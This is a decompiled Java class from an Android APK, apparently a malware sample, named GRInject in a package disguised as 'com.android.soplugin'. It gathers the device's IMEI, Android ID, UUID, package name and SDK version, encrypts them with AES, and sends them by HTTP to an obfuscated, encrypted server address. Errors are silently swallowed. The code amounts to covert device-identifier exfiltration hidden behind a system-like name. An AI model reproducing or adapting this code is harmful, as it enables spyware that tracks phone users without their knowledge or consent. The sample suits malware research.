package com.android.soplugin;

import android.content.Context;
import android.os.Build;
import android.os.IBinder;
import android.text.TextUtils;
import com.android.soplugin.net.HttpRequester;
import com.android.soplugin.net.HttpRespons;
import com.android.soplugin.util.AESHelper;
import com.android.soplugin.util.Base64;
import com.android.soplugin.util.CommUtil;
import com.android.soplugin.util.DataPreference;
import com.android.soplugin.util.MyConfig;
import com.android.soplugin.util.PLog;
import com.jar.api.PlugManagerHelper;
import com.jar.service.BaseInfo;
import com.log.sloth.api.IBaseInfo;
import java.net.URLEncoder;
import java.util.Map;
import org.json.JSONObject;
/* loaded from: /mnt/shared/apks/menSe7ni.dex */
public class GRInject {
    private static String mPlugcallinfoUrl = "8BNTDCCDEIBl8fBUjjdxI3xz3VHWdu/BV5oFx4OzfTl4iuWPTG9TGfut3Gf7KUBd";
    private IBaseInfo mBaseInfo;
    private Context mContext;

    public GRInject(Context context) {
        this.mContext = context;
        IBinder plugService = PlugManagerHelper.getPlugService(BaseInfo.SERVICE_NAME);
        if (plugService == null) {
            return;
        }
        this.mBaseInfo = IBaseInfo.Stub.asInterface(plugService);
    }

    public boolean sendPlugCallInfo(Map<String, String> map, String str) {
        HttpRespons sendGet;
        try {
            PLog.i("The sendInfo is called !\n");
            sendGet = new HttpRequester().sendGet(getUrl(map, str));
        } catch (Exception unused) {
        }
        if (sendGet == null) {
            PLog.i("The sendInfo hr == null !\n");
            return false;
        }
        String content = sendGet.getContent();
        if (!TextUtils.isEmpty(content) && sendGet.getCode() == 200) {
            PLog.i("run() jcode := " + new JSONObject(new String(AESHelper.getAESDecode(MyConfig.PublicKey, Base64.base64Decode(content)), AESHelper.ENCODING)).getString("code"));
            PLog.i("run() getHost := " + sendGet.getHost());
            return true;
        }
        PLog.i("run() Runnable--->hr.getCode() =" + sendGet.getCode());
        return false;
    }

    private String getUrl(Map<String, String> map, String str) {
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("channelId", str);
            jSONObject.put("launchername", this.mContext.getPackageName());
            jSONObject.put("imei", this.mBaseInfo.getIMEI());
            jSONObject.put("androidID", CommUtil.handGetAndroidID(this.mContext));
            jSONObject.put("uuid", this.mBaseInfo.getUUID());
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            String base64Encode = Base64.base64Encode(AESHelper.getAESEncode(MyConfig.PublicKey, jSONObject.toString()));
            AESHelper.getAESDecode(MyConfig.PublicKey, Base64.base64Decode(base64Encode));
            return DataPreference.getBaseUrlInfo(mPlugcallinfoUrl) + "?key=" + URLEncoder.encode(base64Encode);
        } catch (Exception unused) {
            return "";
        }
    }
}
